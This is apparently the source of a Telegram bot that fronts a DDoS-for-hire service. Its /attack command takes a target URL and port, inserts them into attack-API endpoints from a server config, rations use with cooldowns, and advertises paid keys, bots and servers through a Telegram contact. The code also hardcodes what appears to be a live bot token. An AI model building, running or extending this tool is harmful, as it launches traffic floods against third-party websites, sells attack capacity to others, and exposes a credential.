import json
import re
import requests
import asyncio
import random
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime, timedelta

PHOTO_URLS = {
    "loading": "https://ov20-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-1656326255.png",
    "success": "https://ov19-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-3059895128.png",
    "failure": "https://ov12-engine.flamingtext.com/netfu/tmp28016/coollogo_com-31571298.png",
}

admin_uid = 7371969470
allowed_group_ids = [-1002434530321, -1002433677966, -1002486806037, -1002411881962, -1002432759633, -1002334544605, 
                     -5566778899, -6677889900, -7788990011, -8899001122] 

bot_status = {"active": True}
user_status, server_status = {}, {}

def get_server_config(file_path="server.json"):
    try: return json.load(open(file_path, "r"))
    except (FileNotFoundError, json.JSONDecodeError): return {}

def is_valid_url(url): return bool(re.match(r"^https?://", url))

def is_admin(update): return update.message.from_user.id == admin_uid
def is_allowed_group(update): return update.message.chat.id in allowed_group_ids
def is_allowed_user(update): return update.message.from_user.id == admin_uid or is_allowed_group(update)
def is_bot_active(update): return bot_status["active"] or is_admin(update)
def is_user_waiting(update): return update.message.from_user.id in user_status and datetime.now() < user_status[update.message.from_user.id]

def get_available_servers(servers):
    now = datetime.now()
    available_servers = []
    for server in servers:
        status = server_status.get(server["id"], {}).get("status") == "available"
        if status or server_status.get(server["id"], {}).get("busy_until", now) <= now:
            server_status[server["id"]] = {"status": "available", "busy_until": now}
            available_servers.append(server)
    return available_servers

def mark_server_busy(server_id, duration):
    server_status[server_id] = {"status": "busy", "busy_until": datetime.now() + timedelta(seconds=duration)}

async def send_response(update, photo_url, caption, json_content=None):
    formatted_json = f"<pre>{json.dumps(json_content, indent=4, ensure_ascii=False)}</pre>" if json_content else ""
    await update.message.reply_photo(photo=photo_url, caption=f"<b>{caption}</b>\n{formatted_json}", parse_mode="HTML")

async def handle_api_responses(update, responses, selected_server):
    results, success_found = [], False
    for response in responses:
        try:
            json_data = response.json()
            status = response.status_code == 200 and json_data.get("status") == "SUCCESSFULLY"
        except json.JSONDecodeError:
            json_data = {"status": "error", "message": "Kết nối không thành công"}
            status = False
        json_data["server_number"] = selected_server["id"]
        success_found |= status
        results.append(json_data)
    caption = "Kết nối API thành công." if success_found else "Kết nối API thất bại."
    await send_response(update, PHOTO_URLS["success" if success_found else "failure"], caption, results)
    return success_found

async def turn_on(update, context):
    if not is_admin(update):
        return await send_response(update, PHOTO_URLS["failure"], "Bạn không có quyền sử dụng lệnh này.")
    bot_status["active"] = True
    await send_response(update, PHOTO_URLS["success"], "Bot đã được bật.")

async def turn_off(update, context):
    if not is_admin(update):
        return await send_response(update, PHOTO_URLS["failure"], "Bạn không có quyền sử dụng lệnh này.")
    bot_status["active"] = False
    await send_response(update, PHOTO_URLS["success"], "Bot đã được tắt.")

async def attack(update, context):
    if not is_allowed_user(update):
        return await send_response(update, PHOTO_URLS["failure"], "Không được phép: Buy Key - Buy BOT - Buy Server liên hệ [@NeganSSHConsole].")
    if not is_bot_active(update):
        return await send_response(update, PHOTO_URLS["failure"], "Bot hiện đang tắt.")
    user_id = update.message.from_user.id
    if not is_admin(update) and is_user_waiting(update):
        remaining_time = int((user_status[user_id] - datetime.now()).total_seconds())
        return await send_response(update, PHOTO_URLS["failure"], f"Bạn đang có tiến trình khác. Chờ {remaining_time} giây.")
    if len(context.args) < 2 or not is_valid_url(context.args[0]) or not context.args[1].isdigit():
        return await send_response(update, PHOTO_URLS["failure"], "Vui lòng nhập {URL} và {PORT} hợp lệ. Ví dụ: /attack https://example.com 443.")
    target_host, port = context.args[0], context.args[1]
    server_config = get_server_config()
    if not server_config.get("requests"):
        return await send_response(update, PHOTO_URLS["failure"], "Không tìm thấy danh sách server.")
    servers = server_config["requests"]
    available_servers = get_available_servers(servers)
    if not available_servers:
        return await send_response(update, PHOTO_URLS["failure"], "Tất cả server đều bận, vui lòng thử lại sau.")
    selected_server = random.choice(available_servers)
    selected_url = selected_server["url"].replace("{port}", port).replace("{host}", target_host)
    mark_server_busy(selected_server["id"], duration=120)
    try:
        loading_message = await update.message.reply_photo(photo=PHOTO_URLS["loading"], caption="<b>Đang kết nối đến server API...</b>", parse_mode="HTML")
        await asyncio.sleep(3)
        await loading_message.delete()
        response = requests.get(selected_url, headers={"Cookie": server_config.get("cookie", "")})
        success = await handle_api_responses(update, [response], selected_server)
        if success:
            user_status[user_id] = datetime.now() + timedelta(seconds=120)
    except requests.RequestException as e:
        await send_response(update, PHOTO_URLS["failure"], "Kết nối server API thất bại.", [{"status": "error", "message": str(e)}])

def main():
    app = ApplicationBuilder().token("7065038890:AAHmmAVyKvhYaEP8w3CTHbw5x9KYXh37jn0").build()
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("on", turn_on))
    app.add_handler(CommandHandler("off", turn_off))
    app.run_polling()

if __name__ == "__main__":
    main()
